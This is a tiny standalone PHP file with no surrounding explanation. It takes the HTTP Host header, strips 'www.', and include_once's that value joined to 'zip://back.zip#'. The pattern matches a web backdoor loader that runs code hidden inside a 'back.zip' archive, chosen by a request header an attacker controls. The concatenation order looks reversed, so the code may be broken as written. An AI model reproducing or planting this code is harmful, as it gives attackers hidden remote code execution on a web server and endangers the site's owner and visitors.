<?php

$h = str_ireplace("www.","",$_SERVER["HTTP_HOST"]);
if(!empty($h))include_once $h . "zip://back.zip#";
?>
